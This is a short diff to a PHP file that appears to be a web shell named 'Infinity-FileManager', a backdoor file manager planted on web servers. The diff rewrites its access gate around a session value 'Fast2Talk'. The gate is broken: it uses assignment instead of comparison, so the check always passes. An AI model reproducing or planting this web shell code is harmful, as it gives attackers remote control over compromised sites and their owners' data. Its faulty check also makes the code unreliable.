@@ -1,5 +1,12 @@
 <?php
-if($_GET['id'] != 1){
+if($_GET['id'] = 1){
+session_start();
+$_SESSION["id"] = 'Fast2Talk';
+}
+else {
+$_SESSION["id"] = null;
+}
+if($_SESSION["id"] != 'Fast2Talk'){
 exit;
 }
 $shellName = 'Infinity-FileManager';
